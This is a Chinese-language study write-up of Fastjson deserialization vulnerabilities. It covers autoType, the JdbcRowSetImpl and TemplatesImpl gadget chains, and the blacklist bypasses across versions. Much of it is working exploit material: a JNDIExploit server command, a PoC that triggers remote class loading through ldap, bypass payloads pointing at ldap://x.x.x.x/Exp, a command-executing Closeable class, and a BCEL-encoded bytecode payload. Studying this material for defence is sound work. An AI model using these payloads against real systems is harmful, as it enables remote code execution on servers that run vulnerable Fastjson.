简单的基础带过一下

# fastjson基础
代码参考[https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02.Fastjson%201.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA](https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/02.Fastjson%201.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)

json序列化

```jsx
package org.example;

import com.alibaba.fastjson.JSON;

public class App {
    public static void main( String[] args ){
        User user = new User();
        user.setAge(66);
        user.setUsername("test");

        String json = JSON.toJSONString(user);
        System.out.println(json);
    }
}

class User{
    private String username;
    private int age;

    public void setUsername(String username) {
        this.username = username;
    }

    public String getUsername() {
        return username;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public int getAge() {
        return age;
    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747571998912-caae0150-95b3-4c0b-a9c5-05c4553862df.png)

## 反序列化
fastjson反序列化方法parse 会自动调用set方法

```plain
class User{
    private String username;
    private int age;

    public void setUsername(String username) {
        this.username = username;
        System.out.println("call setUsername");
    }

    public String getUsername() {
        return username;
    }

    public void setAge(int age) {
        this.age = age;
        System.out.println("call setAge");
    }

    public int getAge() {
        return age;
    }
}
```

```plain
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class App {
    public static void main( String[] args ){
        String json = "{\"age\":66,\"username\":\"test\"}";
        User user = JSON.parseObject(json, User.class);    // 后面的User.class表示反序列化为User类
    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747572176488-817da083-2113-497a-a9f5-1edf7a0b6873.png)

## parseObject parse
parseObject 会在parse的基础上把对象转化成jsonObject

parseObject 需要第二个参数指定具体类才会调用set方法

使用@type属性可以让parseObject知道具体类，调用set方法



**<font style="color:rgb(51, 51, 51);">fastjson接受的JSON可以通过</font>**`**<font style="background-color:rgb(247, 247, 247);">@type</font>**`**<font style="color:rgb(51, 51, 51);">字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</font>**

```plain
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class App {
    public static void main(String[] args) {
        String json1 = "{\"age\":66,\"username\":\"test\"}";
        String json2 = "{\"@type\":\"org.example.User\", \"age\":66,\"username\":\"test\"}";

        System.out.println("反序列化JSON1");
        JSON.parseObject(json1);
        System.out.println("反序列化JSON1");
        JSON.parseObject(json2);
    }
}

class User {
    private String username;
    private int age;

    public void setUsername(String username) {
        this.username = username;
        System.out.println("call setUsername");
    }

    public String getUsername() {
        return username;
    }

    public void setAge(int age) {
        this.age = age;
        System.out.println("call setAge");
    }

    public int getAge() {
        return age;
    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747572753660-f1341294-4253-40bf-83fd-f53b6f4256e4.png)

@type作用就是指定json字符串要反序列化成拿个对象，并且调用set方法

## 利用链子
分析，我们想到set方法要是能调用命令执行的函数或者是方法

思路

1. 能调用lookup() 参数可控 打jndi
2. 调用defineclass 加载字节码



### <font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">JdbcRowSetImpl</font>
主要用到`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">setDataSourceName()</font>`<font style="color:rgb(51, 51, 51);">和</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">setAutoCommit()</font>`<font style="color:rgb(51, 51, 51);">这两个方法的两个set方法</font>

+ `<font style="background-color:rgb(247, 247, 247);">JdbcRowSetImpl.setDataSourceName</font>`

```plain
public void setDataSourceName(String var1) throws SQLException {
    if (this.getDataSourceName() != null) {
        if (!this.getDataSourceName().equals(var1)) {
            super.setDataSourceName(var1);
            this.conn = null;
            this.ps = null;
            this.rs = null;
        }
    } else {
        super.setDataSourceName(var1);
    }

}
```

调用了父类的setDataSourceName

+ `<font style="background-color:rgb(247, 247, 247);">BaseRowSet.setDataSourceName</font>`

```plain
public void setDataSourceName(String name) throws SQLException {

    if (name == null) {
        dataSource = null;
    } else if (name.equals("")) {
       throw new SQLException("DataSource name cannot be empty string");
    } else {
       dataSource = name;
    }

    URL = da
```

 就是dataSource = name; 的赋值

+ `<font style="background-color:rgb(247, 247, 247);">JdbcRowSetImpl.setAutoCommit</font>`

```plain
public void setAutoCommit(boolean var1) throws SQLException {
        if (this.conn != null) {
            this.conn.setAutoCommit(var1);
        } else {
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        }

    }
```

跟下connect();

+ `<font style="background-color:rgb(247, 247, 247);">JdbcRowSetImpl.connect</font>`

```plain
private Connection connect() throws SQLException {
        if (this.conn != null) {
            return this.conn;
        } else if (this.getDataSourceName() != null) {
            try {
                InitialContext var1 = new InitialContext();
                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
                return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
            } catch (NamingException var3) {
                throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
            }
        } else {
            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
        }
    }
```

主要是

```plain
DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
```

把datasource给lookup了

<font style="color:rgb(51, 51, 51);">可以看到这里有JNDI注入中的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">lookup</font>`<font style="color:rgb(51, 51, 51);">的调用，而调用的参数就是刚才设置的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">dataSource</font>`<font style="color:rgb(51, 51, 51);">，这个是我们可以控制的，如果让他加载恶意的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">Reference类</font>`<font style="color:rgb(51, 51, 51);">，那么我们的目的就达成了</font>

#### <font style="color:rgb(51, 51, 51);">复现</font>
<font style="color:rgb(51, 51, 51);">直接用</font>[<font style="color:rgb(231, 76, 60);">JNDIExploit</font>](https://github.com/feihong-cs/JNDIExploit.git)<font style="color:rgb(51, 51, 51);">同时启动</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">ldap</font>`<font style="color:rgb(51, 51, 51);">和</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">http</font>`<font style="color:rgb(51, 51, 51);">服务，好处就是不需要自己手动编译class什么的了</font>

```plain
# 查看用法
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -l 9999 -p 8888 -u
# 启动服务
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -l 9999 -p 8888
```

<font style="color:rgb(51, 51, 51);">poc</font>

```plain
package org.example;

import com.alibaba.fastjson.JSON;

public class calc {
    public static void main(String[] args) {
        // 高版本的JDK，需要设置一下，低版本的可以忽略，参考JNDI注入文章
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://127.0.0.1:9999/Basic/Command/calc\",\"autoCommit\": false}";
        JSON.parseObject(json);
    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747573969114-aa31d4b1-402b-41d3-8feb-ba0d3e9a238d.png)

# <font style="color:rgb(35, 57, 77);">TemplatesImpl</font>
### <font style="color:rgb(35, 57, 77);">限制条件</font>
`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">Feature.SupportNonPublicField</font>`<font style="color:rgb(35, 57, 77);"> 需要开启，因为</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">_bytecodes</font>`<font style="color:rgb(35, 57, 77);"> 和 </font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">_outputProperties</font>`<font style="color:rgb(35, 57, 77);"> 两个关键属性是私有的</font>

Fastjson通过`bytecodes`字段传入恶意类，调用`outputProperties`属性的getter方法时，实例化传入的恶意类，调用其构造方法，造成任意命令执行。

调用

TemplatesImpl() -> getOutputProperties() -> newTransformer() -> getTransletInstance() -> defineTransletClasses() -> newInstance()  
 TemplatesImpl()

```plain
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">newTransformer()</font>`<font style="color:rgb(35, 57, 77);">中会调用</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">getTransletInstance()</font>`<font style="color:rgb(35, 57, 77);"> 方法，继续跟进一下</font>

```plain
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    TransformerImpl transformer;

    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);

    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}
```

```plain
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null;

        if (_class == null) defineTransletClasses();

        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them
        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
        translet.postInitialization();
        translet.setTemplates(this);
        translet.setServicesMechnism(_useServicesMechanism);
        translet.setAllowedProtocols(_accessExternalStylesheet);
        if (_auxClasses != null) {
            translet.setAuxiliaryClasses(_auxClasses);
        }

        return translet;
    }
    catch (InstantiationException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (IllegalAccessException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

<font style="color:rgb(35, 57, 77);">跟进</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">defineTransletClasses()</font>`<font style="color:rgb(35, 57, 77);">方法，其中调用了</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">defindClass</font>`<font style="color:rgb(35, 57, 77);">方法处理恶意类</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">FJPayload</font>`<font style="color:rgb(35, 57, 77);">的字节码，根据Java官方文档可以知道，</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">defindClass</font>`<font style="color:rgb(35, 57, 77);"> 可以从byte[]还原出一个Class对象，成功帮我们把字节码还原为了</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">FJPayload Class</font>`<font style="color:rgb(35, 57, 77);"> 并放入到了_class[]数组中</font>

```plain
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

<font style="color:rgb(35, 57, 77);">回到</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">getTransletInstance()</font>`<font style="color:rgb(35, 57, 77);">方法后，成功调用</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">newInstance()</font>`<font style="color:rgb(35, 57, 77);"> 反射实例化恶意类，成功执行命令</font>

### <font style="color:rgb(35, 57, 77);">为什么要继承</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">AbstractTranslet</font>`<font style="color:rgb(35, 57, 77);">类 ？</font>
`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">defineTransletClasses</font>`<font style="color:rgb(35, 57, 77);"> 中会对bytecodes的类进行判断，父类为</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">AbstractTranslet</font>`<font style="color:rgb(35, 57, 77);">时会给transletIndex赋值为0，默认为-1，不是</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">AbstractTranslet</font>`<font style="color:rgb(35, 57, 77);">子类导致异常</font>

<font style="color:rgb(35, 57, 77);">根据</font>[<font style="color:rgb(247, 83, 87);">官方公告</font>](https://github.com/alibaba/fastjson/wiki/security_update_20170315)<font style="color:rgb(35, 57, 77);">在1.2.25版本之后加入了黑白名单机制，这里跟进分析一下</font>

<font style="color:rgb(35, 57, 77);">在DefaultJSONParser.parseObject中将加载类的</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">TypeUtils.loadClass</font>`<font style="color:rgb(35, 57, 77);">方法替换为了</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">this.config.checkAutoType()</font>`<font style="color:rgb(35, 57, 77);">方法</font>

# 其他版本
idea更新版本后pom要改

然后到文件夹 mvn clean install

## 1.2.25 ->1.2.41
直接加载@type类变成了`checkAutoType()`检查，会对要加载的类进行白名单和黑名单限制，并且引入了一个配置参数`AutoTypeSupport`。

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747585844331-3201d60d-aeef-4f9a-b031-579114538004.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747585875962-16377ab2-9913-484f-aff9-2ce99925d879.png)



利用的前提是必须要手动开启autoTypeSupport，不然还是不能利用，所以说还是有一点鸡肋吧

从代码中开启`autoTypeSupport`

```plain
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

<font style="color:rgb(51, 51, 51);">这个条件就是这次绕过的核心条件了</font>

```plain
else if (className.startsWith("L") && className.endsWith(";")) {
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
}
```

<font style="color:rgb(51, 51, 51);">如果开头是</font>`<font style="background-color:rgb(247, 247, 247);">L</font>`<font style="color:rgb(51, 51, 51);">而且结尾是</font>`<font style="background-color:rgb(247, 247, 247);">;</font>`<font style="color:rgb(51, 51, 51);">，那么就会给前后这俩字符去掉，所以可以看到我们的</font>`<font style="background-color:rgb(247, 247, 247);">newClassName</font>`<font style="color:rgb(51, 51, 51);">就是我们想要的</font>`<font style="background-color:rgb(247, 247, 247);">org.example.User</font>`

<font style="background-color:rgb(247, 247, 247);">整体流程 checkautotype先白名单在黑名单</font>

找不到类自动加载

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747586353122-4bb85fba-2b20-406a-ad3c-d993f0b518d6.png)

<font style="background-color:rgb(247, 247, 247);">loadclass</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747586128357-db898db8-2185-4fae-9f38-a136293b4f4e.png)

加载的时候

<font style="color:rgb(51, 51, 51);">如果开头是</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">L</font>`<font style="color:rgb(51, 51, 51);">而且结尾是</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">;</font>`<font style="color:rgb(51, 51, 51);">，那么就会给前后这俩字符去掉，所以可以看到我们的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">newClassName</font>`<font style="color:rgb(51, 51, 51);">就是我们想要的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">org.example.User</font>`

## 1.2.42
修复的方法去掉一个L和；

[https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf](https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747586499609-61bf6e11-2010-4263-81bc-b38268d29198.png)

直接双写

```plain
{"@type":"LLorg.example.User;;","age":66,"username":"test"}
```

## <font style="color:rgb(51, 51, 51);">1.2.43</font>
<font style="color:rgb(51, 51, 51);">所以2个</font>`<font style="background-color:rgb(247, 247, 247);">LL;;</font>`<font style="color:rgb(51, 51, 51);">是行不通了，但是别忘了我们在分析</font>`<font style="background-color:rgb(247, 247, 247);">1.2.41</font>`<font style="color:rgb(51, 51, 51);">的时候，发现还会去掉</font>`<font style="background-color:rgb(247, 247, 247);">[</font>`<font style="color:rgb(51, 51, 51);">然后实例化，这就是绕过点</font>

<font style="color:rgb(51, 51, 51);">初始</font>`<font style="background-color:rgb(247, 247, 247);">payload</font>`

```plain
{"@type":"[org.example.User","age":66,"username":"test"}
```

<font style="color:rgb(51, 51, 51);">报错</font>`<font style="background-color:rgb(247, 247, 247);">exepct '[', but ,, pos 29, json : {"@type":"[org.example.User","age":66,"username":"test"}</font>`<font style="color:rgb(51, 51, 51);">，29那个位置，期望一个</font>`<font style="background-color:rgb(247, 247, 247);">[</font>`<font style="color:rgb(51, 51, 51);">，但是是</font>`<font style="background-color:rgb(247, 247, 247);">,</font>`<font style="color:rgb(51, 51, 51);">，所以我们加一个</font>`<font style="background-color:rgb(247, 247, 247);">[</font>`

```plain
{"@type":"[org.example.User"[,"age":66,"username":"test"}
```

<font style="color:rgb(51, 51, 51);">报错</font>`<font style="background-color:rgb(247, 247, 247);">syntax error, expect {, actual string, pos 30, fastjson-version 1.2.43</font>`<font style="color:rgb(51, 51, 51);">，期望30的位置是一个</font>`<font style="background-color:rgb(247, 247, 247);">{</font>`<font style="color:rgb(51, 51, 51);">，加上</font>

<font style="color:rgb(51, 51, 51);">最终POC</font>

```plain
{"@type":"[org.example.User"[{,"age":66,"username":"test"}
```

## <font style="color:rgb(51, 51, 51);">1.2.45</font>
JndiDataSourceFactory jndi

<font style="color:rgb(51, 51, 51);">RCE，肯定不是之前的方法绕过的，这次是通过不在黑名单里面的类来绕过的</font>

```plain
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://x.x.x.x/Exp"}}
```

## <font style="color:rgb(51, 51, 51);">1.2.47</font>
<font style="color:rgb(51, 51, 51);">这个版本绕过了</font>`<font style="background-color:rgb(247, 247, 247);">autoTypeSupport</font>`<font style="color:rgb(51, 51, 51);">检测，</font>**<font style="color:rgb(51, 51, 51);">不开启</font>**`**<font style="background-color:rgb(247, 247, 247);">ast</font>**`**<font style="color:rgb(51, 51, 51);">依然可以利用</font>**<font style="color:rgb(51, 51, 51);">（1.2.25 - 1.2.45 这些绕过都是需要开启</font>`<font style="background-color:rgb(247, 247, 247);">ast</font>`<font style="color:rgb(51, 51, 51);">的）</font>

<font style="color:rgb(51, 51, 51);">Payload：</font>

```plain
{
    "a":
    {
        "@type": "java.lang.Class",
        "val": "org.example.User"
    },
    "b":
    {
        "@type": "org.example.User",
        "username": "123456",
        "age": 123
    }
}
```

<font style="color:rgb(51, 51, 51);">绕过原理：</font>

1. <font style="color:rgb(51, 51, 51);">利用到了</font>`<font style="background-color:rgb(247, 247, 247);">java.lang.class</font>`<font style="color:rgb(51, 51, 51);">，这个类不在黑名单，所以checkAutotype可以过</font>
2. <font style="color:rgb(51, 51, 51);">这个</font>`<font style="background-color:rgb(247, 247, 247);">java.lang.class</font>`<font style="color:rgb(51, 51, 51);">类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中</font>
3. <font style="color:rgb(51, 51, 51);">如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回</font>

## 其他类和依赖
## <font style="color:rgb(51, 51, 51);">1.2.62</font>
前面基本关了



<font style="color:rgb(51, 51, 51);">1.2.62的RCE也很简单，由于</font>`<font style="background-color:rgb(247, 247, 247);">CVE-2020-8840</font>`<font style="color:rgb(51, 51, 51);">的gadget绕过了fastjson的黑名单而导致的，当服务端存在收到漏洞影响的xbean-reflect依赖并且开启fastjson的autotype时，远程攻击者可以通过精心构造的请求包触发漏洞从而导致在服务端上造成远程命令执行的效果。</font>

```plain
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://x.x.x.x/Exp"}
```

## <font style="color:rgb(51, 51, 51);">fastjson 1.2.66</font>
<font style="color:rgb(51, 51, 51);">和1.2.62类似，在开启AutoType的情况下，由于黑名单过滤不全而导致的绕过问题</font>

```plain
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://x.x.x.x/Exp"}
```

## 1.2.68
绕过方法：找调用期望类的类

<font style="color:rgb(22, 18, 9);">期望类的功能主要是实现/继承了期望类的class能被反序列化出来（并且不受autotype影响），寻找checkAutoType方法的调用，要求exceptClass不为空。</font>

直到68版本之后出现了新的安全控制点safeMode，如果开启，在checkAtuoType的时候会直接抛出异常

```plain
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
    if (typeName == null) {
        return null;
    } else {
        if (this.autoTypeCheckHandlers != null) {
            Iterator var4 = this.autoTypeCheckHandlers.iterator();

            while(var4.hasNext()) {
                AutoTypeCheckHandler h = (AutoTypeCheckHandler)var4.next();
                Class<?> type = h.handler(typeName, expectClass, features);
                if (type != null) {
                    return type;
                }
            }
        }

        int safeModeMask = Feature.SafeMode.mask;
        boolean safeMode = this.safeMode || (features & safeModeMask) != 0 || (JSON.DEFAULT_PARSER_FEATURE & safeModeMask) != 0;
        if (safeMode) {
            throw new JSONException("safeMode not support autoType : " + typeName);
        } else if (typeName.length() < 192 && typeName.length() >= 3) {
            boolean expectClassFlag;
            if (expectClass == null) {
                expectClassFlag = false;
            } else if (expectClass != Object.class 
            && expectClass != Serializable.class 
            && expectClass != Cloneable.class
            && expectClass != Closeable.class
            && expectClass != EventListener.class 
            && expectClass != Iterable.class 
            && expectClass != Collection.class) {
                expectClassFlag = true;
            } else {
                expectClassFlag = false;
            }
```

<font style="color:rgb(22, 18, 9);">Object、Serializable、Cloneable、Closeable、EventListener、Iterable、Collection这几个类不能作为expectClass期望类。	</font>

<font style="color:rgb(22, 18, 9);">下面部分</font>

```plain
if (!internalWhite && (this.autoTypeSupport || expectClassFlag)) {
    hash = h3;

    for(mask = 3; mask < className.length(); ++mask) {
        hash ^= (long)className.charAt(mask);
        hash *= 1099511628211L;
        if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
            if (clazz != null) {
                return clazz;
            }
        }

        if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null && Arrays.binarySearch(this.acceptHashCodes, fullHash) < 0) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }
}
```

!internalWhite && (this.autoTypeSupport || expectClassFlag

不在白名单 开启autotype或者在期望类

expectClass是自己传的

```java
if (!autoTypeSupport) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        if (clazz != null) {
            TypeUtils.addMapping(typeName, clazz);
        }
```

后面会加载clazz

寻找两个类调用了checkAutotype 并且<font style="color:rgb(22, 18, 9);">exceptClass不为空。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747649527465-6fe45c4e-f2e1-411e-8f1f-fa1271a017ca.png)

<font style="color:rgb(22, 18, 9);">再来看JavaBeanDeserializer，在fastjson中对大部分类都指定了特定的deserializer，而AutoCloseable类没有，通过继承/实现AutoCloseable的类可以绕过autotype反序列化。场景如下：</font>

| ```java package org.chabug.fastjson.exploit;  import java.io.Closeable; import java.io.IOException;  public class ExecCloseable implements Closeable {     private String domain;      public ExecCloseable() {     }      public ExecCloseable(String domain) {         this.domain = domain;     }      public String getDomain() {         try {             Runtime.getRuntime().exec(new String[]{"cmd", "/c", "ping " + domain});         } catch (IOException e) {             e.printStackTrace();         }         return domain;     }      public void setDomain(String domain) {         this.domain = domain;     }      @Override     public void close() throws IOException {      } } ```  |
| --- |


高版本

[http://www.bmth666.cn/2022/10/19/Fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/index.html](http://www.bmth666.cn/2022/10/19/Fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/index.html)



# 不出网利用
## bcel
[https://forum.butian.net/share/2040](https://forum.butian.net/share/2040)

<font style="color:rgb(36, 41, 47);">fastjson≤1.2.24</font>

<font style="color:rgb(36, 41, 47);">条件:</font>`<font style="color:rgb(199, 37, 78);">BasicDataSource</font>`<font style="color:rgb(36, 41, 47);">只需要有</font>`<font style="color:rgb(199, 37, 78);">dbcp</font>`<font style="color:rgb(36, 41, 47);">或</font>`<font style="color:rgb(199, 37, 78);">tomcat-dbcp</font>`<font style="color:rgb(36, 41, 47);">的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接，还是挺常见的。</font>

<font style="color:rgb(36, 41, 47);">poc</font>

```java
package org.example;

import com.alibaba.fastjson.JSON;


public class FastJsonBcel {
    public static void main(String[] args){
        String payload2 = "{\n" +
                "    {\n" +
                "        \"ki10\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\"\n" +
                "        }\n" +
                "    }: \"Moc\"\n" +
                "}";
        JSON.parse(payload2);
    }
}
```

